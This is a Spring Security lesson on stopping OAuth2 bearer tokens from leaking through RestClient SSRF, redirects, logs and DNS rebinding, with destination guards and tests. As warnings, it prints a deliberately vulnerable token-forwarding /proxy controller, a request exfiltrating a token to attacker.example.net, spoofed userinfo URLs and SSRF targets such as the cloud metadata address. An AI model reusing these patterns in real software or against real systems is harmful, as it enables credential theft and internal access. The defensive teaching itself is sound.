# 18.10. Restricting Hosts, Redirects, and the Risk of Leaking Access Tokens

## Lesson Objectives

In a **Spring Security OAuth 2.0 / OpenID Connect (OIDC) Client** running on **Spring MVC / Servlet**, the application often uses `RestClient` to call a Resource Server with an access token issued by the Authorization Server (AS).

Example:

~~~http
GET /api/orders HTTP/1.1
Host: orders-api.example.com
Authorization: Bearer ACCESS_TOKEN_FOR_ORDERS_API
~~~

A call is only safe when the bearer access token is sent solely to **the right trusted recipient**. If a REST client's URL is controlled by input, a redirect leads to another host, or an interceptor attaches tokens to every request, the application can accidentally send credentials to an unauthorized server.

This lesson focuses on **restricting scheme/host/port**, **controlling HTTP redirects**, and **preventing access token leakage**.

After this lesson, you will be able to:

- Distinguish `registrationId`, client ID, token audience, host, and actual origin.
- Explain why `RestClient.baseUrl(...)` is not a host allowlist.
- Analyze SSRF, open redirects, and the possibility of bearer tokens following redirects.
- Understand why `Authorization` handling across redirects depends on the HTTP client, request factory, and interceptors.
- Build a dedicated `RestClient` using HTTPS, host/port restrictions, and disabled automatic redirects.
- Use access tokens from `OAuth2AuthorizedClient` or an OAuth2-aware interceptor within the appropriate API scope.
- Handle 3xx, 401, and 403 responses; distinguish reauthorization from business request retries.
- Protect tokens from logs, tracing, proxies, DNS rebinding, and arbitrary URL calls.
- Design tests verifying tokens are never sent to external hosts.

## 1. Context: Employee Portal Calling Orders API

Suppose the system consists of:

- **Employee Portal**: Spring Boot Servlet application, acting as OAuth2 Client and OIDC Relying Party.
- **Corporate OP**: OpenID Provider/Authorization Server.
- **Orders API**: OAuth2 Resource Server.

After the user completes Authorization Code Login, Spring Security creates an `Authentication` and an `OAuth2AuthorizedClient` for registration `corporate`. The Portal needs to call Orders API using the corresponding access token.

~~~mermaid
sequenceDiagram
    autonumber
    actor U as User
    participant B as Browser
    participant P as Spring MVC Portal
    participant OP as OpenID Provider
    participant API as Orders API
    U->>B: Access /orders
    B->>P: HTTP request with session
    Note over P: Restore Authentication and authorized client
    P->>OP: Refresh token if needed
    OP-->>P: New access token if refreshed
    P->>API: GET /api/orders, Bearer access token
    API-->>P: Order data
    P-->>B: Render result
~~~

Right call:

~~~http
GET https://orders-api.example.com/api/orders
Authorization: Bearer <ACCESS_TOKEN_FOR_ORDERS_API>
~~~

Wrong call:

~~~http
GET https://attacker.example.net/collect
Authorization: Bearer <ACCESS_TOKEN_FOR_ORDERS_API>
~~~

If the second call happens, the token has reached an unauthorized host. Because a bearer access token can be replayed by anyone holding it during its validity period, this is a security incident even if the attacker might not be able to use the token on every API.

## 2. Host, Origin, and Audience Are Not the Same

| Concept | Example | Meaning |
|---|---|---|
| Registration ID | `corporate` | Spring Security's internal key selecting a client registration |
| Client ID | `employee-portal` | OAuth client identity at the AS |
| Issuer | `https://id.example.com/realms/company` | Token issuer |
| Access token audience | `orders-api` | Resource Server the token was issued for |
| HTTP host | `orders-api.example.com` | Host of the network request |
| HTTP origin | `https://orders-api.example.com:443` | Scheme + host + port |
| Scope | `orders.read` | Granted OAuth permission |
| Redirect target | `https://other.example.net/path` | Different request destination if the client follows redirects |

### 2.1. Registration ID Does Not Restrict the Host

`registrationId="corporate"` only tells Spring Security which OAuth client registration to use. It does not by itself stop `RestClient` from sending the token to `attacker.example.net`.

### 2.2. Token Audience Does Not Restrict the HTTP Client

A JWT access token with `aud=orders-api` may be rejected by another Resource Server due to the wrong audience. Nevertheless, the token can still be **transmitted externally** if `RestClient` is instructed to connect to another host.

API-side audience validation and client-side host allowlisting **are two independent layers of defense**.

### 2.3. Do Not Use the ID Token Instead of the Access Token

An OIDC ID token serves the Relying Party in verifying End-User authentication. When calling normal APIs, retrieve the authorized client's access token:

~~~java
String bearer =
        authorizedClient.getAccessToken().getTokenValue();
~~~

Do not take:

~~~java
String wrongBearer =
        oidcUser.getIdToken().getTokenValue();
~~~

Both ID tokens and access tokens can be JWTs, yet they have different purposes and audiences.

## 3. SSRF and Credentialed Open Proxy Risks

A dangerous controller:

~~~java
@GetMapping("/proxy")
String proxy(
        @RequestParam String targetUrl,
        @RegisteredOAuth2AuthorizedClient("corporate")
        OAuth2AuthorizedClient client) {

    return restClient.get()
            .uri(targetUrl)
            .headers(headers -> headers.setBearerAuth(
                    client.getAccessToken().getTokenValue()))
            .retrieve()
            .body(String.class);
}
~~~

Input:

~~~text
/proxy?targetUrl=https://attacker.example.net/collect
~~~

can cause the backend to send the bearer token to the attacker.

Risks include:

- **SSRF:** the backend accesses unauthorized URLs from its network position.
- **Credential exfiltration:** the access token is placed into headers sent to an external host.
- **Confused deputy:** the backend uses its privileges/tokens on behalf of untrusted input.
- **Internal network access:** the URL can point to endpoints reachable only by the backend.

Never design an endpoint where the browser supplies `registrationId`, principal, and full URL together while the backend supplies a token and calls that URL.

## 4. Why Is `baseUrl` Not a Security Measure?

Example:

~~~java
RestClient ordersClient = RestClient.builder()
        .baseUrl("https://orders-api.example.com")
        .build();
~~~

Usage:

~~~java
ordersClient.get()
        .uri("/api/orders")
        .retrieve()
        .body(String.class);
~~~

normally goes to Orders API. However, if the application passes an **absolute URI**, the final host can differ from `baseUrl`.

Thus `baseUrl(...)` is a **URI-building convenience**, not a host validation policy.

### 4.1. Never Let Users Decide the Full URL

If business logic only needs an order ID, accept:

~~~text
GET /orders/ORD-123
~~~

and build the URI:

~~~java
ordersClient.get()
        .uri("/api/orders/{orderId}", orderId)
        .retrieve()
        .body(OrderView.class);
~~~

`orderId` must be validated against the business schema. Never turn it into a caller-defined full URL.

### 4.2. Avoid Uncontrolled String Concatenation

Pattern:

~~~java
String url = "https://orders-api.example.com" + userInput;
~~~

easily introduces path, query, and URL-encoding bugs. Use fixed URI templates and verify the final URL before sending requests.

### 4.3. Do Not Check URLs Only at the Controller Layer

A URL can originate from a service layer, message queue, tenant config, or indirect HTTP library. When a `RestClient` carries a bearer token, put a **guard inside the dedicated client itself** so every call path is checked.

## 5. Scheme, Host, and Port Allowlist Policy

A policy for Orders API:

~~~text
Scheme: HTTPS
Host: orders-api.example.com
Port: default HTTPS or 443
Userinfo: disallowed
Redirect: do not auto-follow
~~~

### 5.1. Enforce HTTPS

~~~text
https://orders-api.example.com/api/orders -> allowed
http://orders-api.example.com/api/orders  -> rejected
~~~

Once a token is sent over plain HTTP, a subsequent redirect to HTTPS cannot undo the credential exposure on the initial request.

### 5.2. Host Must Match Exactly

~~~text
orders-api.example.com              -> allowed
orders-api.example.com.evil.net     -> rejected
orders-api-example.com              -> rejected
evil-orders-api.example.com         -> rejected
~~~

Never use `contains(...)` on URL or hostname strings. A spoofed host can contain the entire trusted hostname as a substring.

### 5.3. Check the Port

~~~text
https://orders-api.example.com      -> default HTTPS port
https://orders-api.example.com:443  -> port 443
https://orders-api.example.com:8443 -> port disallowed
~~~

A different port on the same host may run another application that must not receive the token.

### 5.4. Do Not Confuse Userinfo with Host

A URL shaped like:

~~~text
https://orders-api.example.com@attacker.example.net/collect
~~~

has actual host `attacker.example.net`; the string `orders-api.example.com` sits inside userinfo.

Never validate with `url.contains("orders-api.example.com")`. Parse the URI and inspect `getHost()` and `getRawUserInfo()`.

### 5.5. Canonicalization and Special Addresses

Check:

- Hostname case sensitivity.
- Trailing dots.
- Punycode/Internationalized Domain Names.
- IPv4/IPv6 literals.
- URIs with unparseable hosts or unusual characters.
- URL encoding and path normalization.

For fixed hosts, control is usually cleanest by comparing the **exact hostname** and rejecting unexpected forms rather than trying to guess normalization rules.

### 5.6. A Valid Host Does Not Mean Every Path Is Allowed

If a host serves both public APIs and admin endpoints, do not let a REST client carrying a user token call arbitrary paths.

Use fixed paths or route templates, and enforce path/method policies where required by the API contract.

## 6. HTTP Redirects Can Forward Credentials to Another Target

An Orders API response:

~~~http
HTTP/1.1 302 Found
Location: https://attacker.example.net/collect
~~~

If the initial request carried a Bearer header and the HTTP client automatically follows `Location`, a second request will be sent.

Token leakage occurs if the second request **retains or gets re-attached** the `Authorization` header.

### 6.1. Do Not Guess the Behavior of Every HTTP Client

Redirect behavior depends on:

- Underlying HTTP client: JDK, Apache HttpClient, or another implementation.
- `ClientHttpRequestFactory` used by `RestClient`.
- HTTP method and status code.
- Whether the redirect target is same-origin or cross-origin.
- HTTP client header filtering.
- Whether interceptors or custom logic re-attach the Bearer token.

Some clients strip `Authorization` on cross-origin redirects, some restrict methods, and some do not auto-follow. **Neither claim that every `RestClient` leaks nor assume every `RestClient` is always safe**.

### 6.2. What Does Same-Origin Mean?

Origin is defined by scheme, host, and port.

~~~text
https://orders-api.example.com
https://orders-api.example.com:8443
http://orders-api.example.com
https://orders-cdn.example.com
~~~

are not the same origin.

Two subdomains under the same parent domain are likewise not automatically permitted to receive the same bearer token.

### 6.3. Be Careful with Same-Host Redirects Too

One host can serve multiple applications/paths. Remaining on the same host does not prove the new route needs the access token or should receive the original POST payload.

When needed, inspect path, method, audience, and endpoint policies.

### 6.4. Redirect Status Codes

| Code | Worth Noting |
|---|---|
| 301 | Permanent redirect; may be cached |
| 302 | Common redirect; method behavior varies by client |
| 303 | Normally instructs the client to switch to GET |
| 307 | Preserves method and body if followed |
| 308 | Permanent redirect; preserves method and body if followed |

307/308 are risky for POSTs: the body can be re-sent to the new host **along with the `Authorization` header** if the client lacks protective policies.

Do not handle only 302 while ignoring other 3xx codes.

## 7. Disabling Automatic Redirects for APIs Carrying Bearer Tokens

For a client calling only one trusted API, a simple strategy:

1. API target comes from configuration/backend.
2. Final URI must match approved HTTPS, host, and port.
3. The HTTP client **does not automatically follow redirects**.
4. On receiving 3xx, the application inspects `Location` instead of auto-following.
5. If another request is needed, build it under the new policy without forwarding credentials automatically.

### 7.1. Why Might an Initial Guard Not Be Enough?

An interceptor may validate the initial request:

~~~text
https://orders-api.example.com/api/orders
~~~

yet subsequent redirects handled by the underlying HTTP client may execute **below or outside that interceptor**, depending on the implementation.

Hence checking the URI in an interceptor does not by itself prove every redirect hop was validated. Disabling auto-follow at the request factory is an independent layer of defense.

### 7.2. A Redirect from a Trusted Host Does Not Automatically Make the Target Trusted

Orders API might contain an open redirect or misconfiguration. A `Location` in a response is untrusted data to verify, not a certificate permitting access token forwarding to the new target.

### 7.3. If the API Redirects to a CDN or New Host

Do not forward the Orders API token on a 302 to a CDN merely because the response asks for it.

If the CDN uses a signed URL, use a separate HTTP client **without a bearer token** to download the resource per policy. If the CDN is a separate Resource Server, obtain a token with the right audience/resource.

If the API permanently changes domains, verify the new host, TLS, egress, and token contract, then update configuration in a controlled release.

## 8. Writing a Destination Guard Using `java.net.URI`

~~~java
import java.net.URI;

public final class OrdersDestinationPolicy {

    private static final String TRUSTED_HOST =
            "orders-api.example.com";

    private OrdersDestinationPolicy() {}

    public static void requireTrusted(URI uri) {
        if (uri == null
                || !uri.isAbsolute()
                || uri.isOpaque()
                || !"https".equalsIgnoreCase(uri.getScheme())
                || !TRUSTED_HOST.equalsIgnoreCase(uri.getHost())
                || (uri.getPort() != -1 && uri.getPort() != 443)
                || uri.getRawUserInfo() != null
                || uri.getRawFragment() != null) {
            throw new IllegalArgumentException(
                    "Untrusted Orders API destination");
        }
    }
}
~~~

This policy rejects:

~~~text
http://orders-api.example.com/api/orders
https://orders-api.example.com:8443/api/orders
https://orders-api.example.com@evil.net/api/orders
https://orders-api.example.com.evil.net/api/orders
https://localhost/api/orders
https://127.0.0.1/api/orders
https://169.254.169.254/latest/meta-data
~~~

This is an **application-layer URI check** and does not cover all SSRF/DNS rebinding vectors. Combine it with network controls if connections could resolve to unexpected IPs.

## 9. Servlet `RestClient` with Apache HttpClient 5

### 9.1. Dependencies

Maven example:

~~~xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>

<dependency>
    <groupId>org.apache.httpcomponents.client5</groupId>
    <artifactId>httpclient5</artifactId>
</dependency>
~~~

For compatibility, rely on Spring Boot's dependency management. The example uses Spring Framework 6.1+ `RestClient`.

### 9.2. Dedicated Client with Redirects Disabled

~~~java
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.web.client.RestClient;

@Configuration
public class OrdersRestClientConfiguration {

    @Bean
    RestClient ordersRestClient() {
        CloseableHttpClient httpClient = HttpClients.custom()
                .disableRedirectHandling()
                .build();

        var requestFactory =
                new HttpComponentsClientHttpRequestFactory(httpClient);

        return RestClient.builder()
                .baseUrl("https://orders-api.example.com")
                .requestFactory(requestFactory)
                .requestInterceptor((request, body, execution) -> {
                    OrdersDestinationPolicy.requireTrusted(
                            request.getURI());
                    return execution.execute(request, body);
                })
                .build();
    }
}
~~~

Meaning:

- `baseUrl` is the default URI for relative path calls.
- The destination interceptor checks the actual URI before the outbound request executes.
- Apache HttpClient 5's `disableRedirectHandling()` stops automatic following of HTTP 3xx responses.
- The client is dedicated strictly to Orders API.

How redirects are disabled in JDK `HttpClient` or other request factories **does not necessarily match Apache's syntax**. Verify the exact HTTP client stack configured in your project.

### 9.3. Do Not Treat the Interceptor as the Sole Protection

Without disabling automatic redirects, the underlying HTTP client can follow `Location` at a layer that bypasses the application's same-origin guard.

Combining **final URL guard + disabled redirects + dedicated client** is much easier to reason about.

## 10. Using the Access Token in a Controller

~~~java
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.annotation.RegisteredOAuth2AuthorizedClient;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClient;

@RestController
public class OrdersProxyController {

    private final RestClient ordersRestClient;

    public OrdersProxyController(RestClient ordersRestClient) {
        this.ordersRestClient = ordersRestClient;
    }

    @GetMapping("/orders/{orderId}")
    OrderView order(
            @PathVariable String orderId,
            @RegisteredOAuth2AuthorizedClient("corporate")
            OAuth2AuthorizedClient authorizedClient) {

        if (authorizedClient == null
                || authorizedClient.getAccessToken() == null) {
            throw new IllegalStateException(
                    "No authorized client available");
        }

        String accessToken =
                authorizedClient.getAccessToken().getTokenValue();

        return ordersRestClient.get()
                .uri("/api/orders/{orderId}", orderId)
                .headers(headers -> headers.setBearerAuth(accessToken))
                .retrieve()
                .body(OrderView.class);
    }

    record OrderView(String id, String description) {}
}
~~~

This snippet illustrates:

1. Selecting the authorized client for registration `corporate`.
2. Retrieving the **access token**.
3. Calling a fixed path with a route template.
4. Host guard inspecting the request.
5. HTTP client not auto-following redirects.

This is not yet complete production code: it still needs `orderId` validation, API error handling, and token expiry/refresh via `OAuth2AuthorizedClientManager` or matching integration.

Never return the raw access token to the browser just so frontend code can call APIs when using a backend-for-frontend architecture.

## 11. OAuth2-Aware `RestClient` and Interceptor

On Spring Security versions supporting `RestClient` integration, `OAuth2ClientHttpRequestInterceptor` can use `OAuth2AuthorizedClientManager` to retrieve and attach access tokens.

### 11.1. A Global Interceptor Can Be Too Broad

Risk model:

~~~text
Global RestClient
  + OAuth2 interceptor
  + any component can pass a full URL
  = can send access tokens to the wrong host
~~~

Never attach tokens by default to every outbound request where the application builds URLs freely.

### 11.2. Client with OAuth Interceptor and Host Guard

Example with Spring Security supporting `OAuth2ClientHttpRequestInterceptor` (e.g., 6.4+):

~~~java
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.client.OAuth2ClientHttpRequestInterceptor;
import org.springframework.web.client.RestClient;

@Configuration
public class OAuthOrdersClientConfig {

    @Bean
    RestClient oauthOrdersRestClient(
            OAuth2AuthorizedClientManager manager) {

        var httpClient = HttpClients.custom()
                .disableRedirectHandling()
                .build();

        var factory =
                new HttpComponentsClientHttpRequestFactory(httpClient);

        var oauth =
                new OAuth2ClientHttpRequestInterceptor(manager);

        return RestClient.builder()
                .baseUrl("https://orders-api.example.com")
                .requestFactory(factory)
                .requestInterceptor((request, body, execution) -> {
                    OrdersDestinationPolicy.requireTrusted(
                            request.getURI());
                    return execution.execute(request, body);
                })
                .requestInterceptor(oauth)
                .build();
    }
}
~~~

When calling:

~~~java
import static org.springframework.security.oauth2.client.web.client
        .OAuth2ClientHttpRequestInterceptor.clientRegistrationId;

String orders = oauthOrdersRestClient.get()
        .uri("/api/orders")
        .attributes(clientRegistrationId("corporate"))
        .retrieve()
        .body(String.class);
~~~

Selecting a registration does not guarantee the token fits every API; the AS/RS must have matching audience/scope contracts.

Exact APIs and integration details depend on your Spring Security version, yet host and redirect policies must be enforced in every version.

### 11.3. Interceptor Ordering

The guard should validate before any token-bearing request executes. However, relying on interceptor ordering alone **does not address redirects auto-followed by the underlying client**.

### 11.4. Never Send One API's Token to Another API

An access token meant for Orders API must not be used by default to call Billing API, even under the same AS. Separate `RestClient`s, registration/token selection, and host policies per Resource Server.

## 12. Manual Redirect Handling When Needed

If an API contract requires redirects, handle them at the application layer:

1. Disable automatic redirects in the HTTP client.
2. Receive the 3xx response and read `Location`.
3. Parse/resolve `Location` with a standard URI parser.
4. Validate scheme, host, port, userinfo, and route at **each hop**.
5. Cap hop counts and block loops.
6. Decide whether the new target may receive the token; never forward bearer credentials across origins automatically.
7. Check 307/308 statuses before re-sending methods/bodies.
8. If the target uses a signed URL, consider a dedicated client carrying no `Authorization` header.

**Do not build a generic redirect handler for all APIs if business logic does not need redirects.**

### 12.1. A Signed URL Can Also Be a Credential

A download URL with a signature in its query string can grant access to a resource. Never log or expose the full URL if it acts as a credential.

Never attach the Orders API access token to a signed URL unless the contract explicitly requires it.

## 13. SSRF, DNS, and Outbound Network Policies

An untrusted URL can target:

~~~text
http://127.0.0.1:8080/admin
http://localhost/
http://10.0.1.8/internal
http://169.254.169.254/
http://[::1]/
https://metadata.internal/
~~~

The backend can reach internal networks inaccessible from external browsers. A proxy attaching bearer tokens compounds the impact when routes are unrestricted.

### 13.1. DNS Rebinding

If a valid hostname resolves via DNS to an unexpected address, a hostname string allowlist alone may not guarantee the final destination IP.

Consider:

- Are the resolver and CNAME chain trustworthy?
- Can routes reach private/loopback/link-local IPs?
- Could DNS change after validation?
- Does the HTTP client re-resolve upon connecting?
- Does an egress firewall/proxy enforce real destination limits?

Performing one DNS check followed later by connecting can suffer from a race (TOCTOU).

### 13.2. Egress Restrictions

Firewalls, cloud security groups, service meshes, outbound proxies, or `NetworkPolicy` can restrict the backend to connecting only to required APIs.

This is an additive layer, not a replacement for URL validation and token audience checks.

### 13.3. Outbound Proxies

If the REST client uses a proxy, verify whether the proxy is permitted to see/log `Authorization` headers, whether TLS is verified end-to-end to the target host, and whether the proxy can alter routing.

Never disable certificate validation or hostname verification to "fix" proxy issues.

## 14. Other Ways Access Tokens Leak

### 14.1. Query Strings

Avoid:

~~~text
https://orders-api.example.com/api/orders?access_token=ACCESS_A1
~~~

URLs appear in access logs, tracing, and elsewhere. Use the Bearer header over HTTPS.

### 14.2. Logging Interceptors

Dangerous pattern:

~~~java
logger.info("Request headers: {}", request.getHeaders());
~~~

If the request carries `Authorization`, the token value enters logs.

Redact or omit sensitive headers:

~~~text
Authorization
Proxy-Authorization
Cookie
Set-Cookie
~~~

### 14.3. APM and Distributed Tracing

Some tools capture URLs, headers, or bodies. Configure them not to collect access tokens, refresh tokens, client secrets, or session cookies.

Use an independent correlation ID; never use raw tokens or token substrings as IDs.

### 14.4. Exceptions

Never put raw request headers into displayed messages or logs. For example, avoid:

~~~text
Request failed with Authorization=Bearer ACCESS_A1
~~~

Instead log error codes, normalized destinations, registration IDs, and correlation IDs.

### 14.5. HTTPS Does Not Replace Host Policy

HTTPS secures the channel to **the connected host**. If that host belongs to an attacker holding a valid certificate, the token still goes to the attacker.

Therefore you need both TLS verification **and** destination controls.

## 15. API 3xx, 401, 403, and Retries

| Response | Common Meaning | Appropriate Action |
|---|---|---|
| 3xx | Server suggests switching URL | Do not auto-follow with tokens; inspect `Location` |
| 401 | Token invalid/rejected | Inspect token, issuer, audience, expiry |
| 403 | Insufficient permissions for action | Inspect scope/authority/ownership |
| 5xx | API server error | Bounded retry, check idempotency |
| Timeout | Unknown whether server processed request | Do not blindly retry side-effecting operations |

### 15.1. 401 Does Not Mean Switch Hosts

If Orders API returns 401, inspect the access token, expiry, audience, issuer, scope, and revocation. Never try sending the same bearer token to multiple other hosts hunting for one that accepts it.

### 15.2. 403 Is Not Fixed by Refreshing

If `orders.approve` is missing, refreshing a token usually does not grant extra permissions. Check AS/RS policies and business authorization.

### 15.3. Do Not Arbitrarily Retry POSTs

If a payment/order-approval POST times out or receives a 307 redirect, retrying can cause duplicate side effects. Enforce idempotency and separate redirect controls.

## 16. OIDC Redirects Differ from REST Client Redirects

OIDC Authorization Code flow involves:

- Browser redirecting to the OP.
- OP redirecting back to the RP's registered callback.
- RP verifying `state`, PKCE/nonce per flow, and validating tokens.

That is **inbound login**.

In this lesson, `RestClient` sends a bearer access token to Orders API and might receive HTTP 3xx. That is **outbound HTTP**. OIDC `state` and PKCE **do not automatically protect** the access token's path if `RestClient` auto-follows redirects.

| Boundary | Primary Control |
|---|---|
| Browser → RP callback | Registered redirect URI, state, PKCE/nonce |
| RP → Token endpoint | Client authentication, TLS, grant |
| RP → Resource Server | Access token, host policy, HTTPS |
| HTTP redirect target | Redirect policy and destination validation |
| API authorization | Token validation, audience, scope, ownership |

## 17. Splitting Clients Per Resource Server

An application might call:

~~~text
Orders API    -> orders-api.example.com    -> orders.read
Billing API   -> billing-api.example.com   -> billing.read
Reports API   -> reports-api.example.com   -> reports.read
~~~

Maintain a dedicated `RestClient` for each API with:

- Approved base URL and hostname.
- Explicit redirect policy.
- OAuth registration/token matching the audience.
- Logging redaction.
- Timeout and retry policies.
- Controlled route templates.

Never use one global `RestClient` that automatically attaches the current principal's token to any domain a caller supplies.

### 17.1. Service Tokens Must Also Be Restricted

The `client_credentials` grant issues tokens to a client/service without an OIDC user. Because service tokens often hold broad permissions, sending one to the wrong host can have even worse consequences than leaking a single user's token.

Host/redirect/egress controls apply to both user tokens and service tokens.

## 18. Testing Host and Redirect Restrictions

### 18.1. Cases to Test

| Input/Response | Expected Outcome |
|---|---|
| Relative URI `/api/orders` | Connects to Orders API properly |
| Absolute URI with attacker host | Rejected before sending request |
| URI with userinfo `orders-api.example.com@evil.net` | Rejected |
| HTTP instead of HTTPS | Rejected |
| Port 8443 outside allowlist | Rejected |
| Host merely containing a similar substring | Rejected |
| API returns 302 to another host | Does not auto-follow |
| API returns 307/308 to another host | Does not re-send method/body/token |
| API returns 401 | Does not switch hosts or leak token |
| API returns 403 | Does not self-escalate permissions |
| Logging enabled | No raw token appears |
| DNS resolves to unexpected IP | Egress policy blocks |

### 18.2. Unit Test for URI Policy

~~~java
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.net.URI;
import org.junit.jupiter.api.Test;

class OrdersDestinationPolicyTest {

    @Test
    void acceptsApprovedOrigin() {
        assertDoesNotThrow(() ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://orders-api.example.com/api/orders")));
    }

    @Test
    void rejectsWrongHost() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://evil.example.net/collect")));
    }

    @Test
    void rejectsHttp() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "http://orders-api.example.com/api/orders")));
    }

    @Test
    void rejectsUnexpectedPort() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://orders-api.example.com:8443/orders")));
    }
}
~~~

This unit test only verifies URI policy; **it does not prove the HTTP client's redirect behavior**.

### 18.3. Redirect Integration Test

1. Spin up an Orders API test server returning 302/307/308 with `Location` pointing to a second test server.
2. Use the exact production `RestClient` and request factory.
3. Verify the second test server receives no request and no Bearer token.
4. Test absolute URIs with wrong hosts/ports.
5. Verify the first server receives the dummy token as expected.
6. Verify logs contain no raw tokens.
7. If manual redirects are implemented, verify each hop is validated and tokens follow policy.

Mocking only at the interceptor layer may fail to exercise real redirects in the underlying HTTP client. Integration tests with real HTTP test servers therefore provide value beyond unit tests.

Never use production access tokens in tests.

## 19. When Token Exposure Is Suspected

If a log or packet capture shows an access token sent to the wrong host:

1. Close the leak vector: restrict URIs, block dynamic URLs, disable auto-redirects.
2. Identify the token type, registration, principal, and affected APIs without sharing raw values.
3. Evaluate revocation/rotation at the AS per incident-response procedures.
4. Check whether refresh tokens, client secrets, or session cookies were exposed alongside it.
5. Inspect egress logs, API logs, and anomalous usage.
6. Scrub credential copies from logs/tickets/tracing per policy.
7. Add tests and network restrictions.

**Deleting `OAuth2AuthorizedClient` locally does not automatically revoke the token at the AS.** The API may still accept the access token until expiry/revocation per policy.

## 20. Common Misconceptions

**"Once `baseUrl` is set, no other host can be called."**

False. An absolute URI can override the target. A destination guard is required.

**"Every HTTP client forwards `Authorization` on redirects."**

No. It depends on the implementation.

**"Every HTTP client strips `Authorization` on cross-origin redirects."**

You cannot assume that either. It depends on configuration and custom interceptors; test it.

**"A redirect from a trusted host means the target host is trusted."**

No. It could be an open redirect or misconfiguration. The target must be approved independently.

**"Two subdomains under the same parent domain should share an access token."**

No. Their origins and Resource Servers may differ.

**"The token's audience is enough to stop token leaks."**

No. Audience limits who accepts the token, not where the client transmits it.

**"HTTPS guarantees tokens won't leak."**

Not if the client mistakenly connects to an attacker's host over valid HTTPS.

**"OIDC `state`/PKCE already protects `RestClient` redirects."**

No. `state`/PKCE protect the Authorization Code flow, not outbound HTTP policies.

**"If the API returns 302, always follow with the bearer token."**

No. Evaluate `Location`, host, audience, and contract.

**"Blocking private IPs alone completely prevents SSRF."**

No. There are still DNS, redirects, proxies, and untrusted public hosts.

## 21. Practical Scenarios

### Scenario A: URL from the Browser

A controller accepts `targetUrl` and uses a Bearer-enabled `RestClient`.

**Handling:** never accept full URLs; build URLs from business routes/IDs and enforce a destination guard.

### Scenario B: 302 to a CDN

Orders API redirects to `https://files.example.net/export`.

**Handling:** do not auto-follow with Orders token. Use a separate tokenless client, or a token meant for that resource if the contract permits.

### Scenario C: POST Receives 307

The API returns 307 to a new host.

**Handling:** never automatically re-send body and token to that host. If retry is required, evaluate method, target, and idempotency.

### Scenario D: Absolute URI Overrides `baseUrl`

A developer calls `ordersClient.get().uri(userUrl)`.

**Handling:** the guard inspects the final URI and rejects other hosts.

### Scenario E: Token in Logs

An interceptor logs all headers.

**Handling:** enable redaction, clean up exposed records, and evaluate token revocation when needed.

### Scenario F: API Changes Domain

Orders API moves to a new host and returns 301.

**Handling:** verify the new host, TLS, and audience, then update config in a controlled manner instead of auto-following with old tokens.

## 22. Self-Check Questions

**1. Why is `RestClient.baseUrl(...)` not enough to prevent access token leakage?**

Because an absolute URI or custom resolver can change the final host; check the actual URI before making the request.

**2. What should a minimal host policy verify?**

HTTPS, exact hostname, port, userinfo/URI structure; plus path/method and egress controls when needed.

**3. Can you check `url.contains("orders-api.example.com")`?**

No. That substring can appear in userinfo or a spoofed hostname. Parse the URI and inspect `getHost()`.

**4. Why can a 302 leak tokens?**

The client or an interceptor may retain or re-attach `Authorization` on the follow-up request to another host.

**5. Can we claim every HTTP client forwards `Authorization` cross-origin?**

No. Behavior varies by implementation and configuration.

**6. Why is disabling auto-redirects helpful?**

It prevents the HTTP client from making a second request to a target not validated by the application.

**7. What is special about 307/308?**

They preserve method and body when followed, so POST payloads and bearer tokens can be re-sent.

**8. Does a valid hostname guarantee the connected IP is safe?**

No. Consider DNS rebinding, proxies, and egress policies.

**9. Can an ID token replace an access token when the API returns 401?**

No. The ID token belongs to OIDC authentication at the RP, not API access tokens.

**10. When an API changes domains, should you auto-follow redirects with the old token?**

No. Evaluate the new host, TLS, audience/scope, and configuration.

**11. If an API returns 403, does refreshing the token fix it?**

No. It may be missing scopes/business permissions; refreshing does not elevate permissions by default.

**12. After a suspected token leak, is deleting the authorized client enough?**

No. Evaluate whether the token remains valid at the AS/RS and perform revocation per policy.

## Key Takeaways

- **Bearer access tokens must only be sent to approved Resource Servers and hosts.** Registration ID is not a host allowlist; API-side audience validation does not replace outbound policy.
- **`RestClient.baseUrl(...)` is not a security boundary.** Use fixed routes and verify the final URI.
- **HTTP redirects can change the origin receiving credentials.** `Authorization` forwarding depends on the HTTP client; disabling automatic redirects is usually the safest, clearest choice for token-bearing REST clients.
- **Verify HTTPS, exact hostname, port, and URI structure**, combined with egress/DNS/proxy controls to reduce SSRF.
- **Separate clients per API and pick access tokens with the right audience/scope**; never attach tokens to browser-chosen URLs.
- **Never put tokens into queries, logs, tracing, or exceptions**, and never disable TLS certificate verification.
- **Handle 3xx, 401, and 403 at the right layer**, avoiding retries of side-effecting business requests without idempotency.
- **After suspected token exposure**, evaluate and remediate actual credentials rather than merely deleting local records.
